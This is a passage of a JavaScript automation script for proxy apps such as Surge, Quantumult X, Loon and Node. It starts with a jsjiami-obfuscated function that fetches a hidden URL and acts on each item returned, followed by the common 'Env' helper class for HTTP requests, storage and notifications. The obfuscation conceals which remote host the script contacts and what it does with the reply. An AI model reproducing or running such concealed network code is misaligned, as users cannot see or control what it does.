_0x186503!==_0xc10aef;},'dZigo':_0x4c30('52','w7nz'),'aLrAd':_0x4c30('53','fZXM'),'qzmDb':function(_0x5e73a2,_0x264b5d){return _0x5e73a2(_0x264b5d);},'QZCQU':function(_0x337c86,_0x42661a){return _0x337c86<_0x42661a;},'DOLOn':_0x4c30('54','w7nz'),'dvfYc':_0x4c30('55','^&RO'),'qsUZQ':function(_0x98db8e){return _0x98db8e();},'MMtow':_0x4c30('56','0JIB'),'EHVcM':_0x4c30('57','KTom')};return new Promise(_0x336f98=>{var _0x4b7cc6={'qEElw':function(_0xe2f133,_0x1db957){return _0xafc866[_0x4c30('58','##cr')](_0xe2f133,_0x1db957);},'JIBSi':_0xafc866[_0x4c30('59','*FBn')],'sTRqC':_0xafc866[_0x4c30('5a','TLVm')],'hzTvM':function(_0x49b8eb,_0x2928d3){return _0xafc866[_0x4c30('5b','W#qq')](_0x49b8eb,_0x2928d3);},'nAMTj':function(_0x5e2905,_0x27dc7e){return _0xafc866[_0x4c30('5c',']g*6')](_0x5e2905,_0x27dc7e);},'JrHud':function(_0x459883,_0x5c7dc6){return _0xafc866[_0x4c30('5d','NXTx')](_0x459883,_0x5c7dc6);},'QSmei':function(_0x4e8701,_0x4d5c4a){return _0xafc866[_0x4c30('5e','pDyU')](_0x4e8701,_0x4d5c4a);},'nbVor':_0xafc866[_0x4c30('5f','jni!')],'CwdIo':_0xafc866[_0x4c30('60','TLVm')],'MeyPS':function(_0x37507d){return _0xafc866[_0x4c30('61','##cr')](_0x37507d);}};$[_0x4c30('62','3sz5')]({'url':_0xafc866[_0x4c30('63','WtXY')],'headers':{'User-Agent':_0xafc866[_0x4c30('64','ZjBC')]}},async(_0x2e4b8d,_0x36c773,_0x4753b0)=>{try{if(_0x2e4b8d){if(_0x4b7cc6[_0x4c30('65','lxSV')](_0x4b7cc6[_0x4c30('66','pDyU')],_0x4b7cc6[_0x4c30('67','$wy%')])){console[_0x4c30('68','jA6T')]($[_0x4c30('69','BWUs')]+_0x4c30('6a','BWre'));}else{console[_0x4c30('6b','Rx]Y')]($[_0x4c30('6c','7Q]8')]+_0x4c30('6d','^&RO'));}}else{if(_0x4b7cc6[_0x4c30('6e','Q^8Y')](safeGet,_0x4753b0)){$[_0x4c30('6f','0JIB')]=JSON[_0x4c30('70','ZayU')](_0x4753b0);if(_0x4b7cc6[_0x4c30('71','bE&m')]($[_0x4c30('72','N1yZ')][_0x4c30('73','ZWYx')],0x0)){for(let _0x2983f7=0x0;_0x4b7cc6[_0x4c30('74','*$7p')](_0x2983f7,$[_0x4c30('75','^&RO')][_0x4c30('76','1wL9')]);_0x2983f7++){if(_0x4b7cc6[_0x4c30('77','^&RO')](_0x4b7cc6[_0x4c30('78','BWre')],_0x4b7cc6[_0x4c30('79','o84Q')])){let _0x4cd9e6=$[_0x4c30('7a','1wL9')][_0x2983f7];await $[_0x4c30('7b','(DHo')](0x1f4);await _0x4b7cc6[_0x4c30('7c','bE&m')](wuzhi,_0x4cd9e6);}else{$[_0x4c30('7d','1wL9')](e);}}}}}}catch(_0x3a401e){$[_0x4c30('7e','ZWYx')](_0x3a401e);}finally{_0x4b7cc6[_0x4c30('7f','KSu5')](_0x336f98);}});});};_0xod4='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
